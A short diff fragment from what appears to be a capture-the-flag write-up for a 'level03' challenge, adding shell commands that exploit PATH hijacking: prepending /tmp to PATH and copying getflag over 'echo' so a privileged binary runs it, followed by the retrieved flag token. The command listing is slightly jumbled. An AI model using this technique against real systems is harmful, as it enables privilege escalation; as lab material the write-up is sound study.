@@ -46,3 +46,14 @@ void main(void)
     return;
 }
 ```
+```
+$> echo $PATH
+$> export PATH=/tmp:$PATH
+$> which getflag
+$> /bin/getflag
+$> cp /bin/getflag /tmp/echo
+$> cd ~ ; ./level03````
+$> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+```
+
+> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
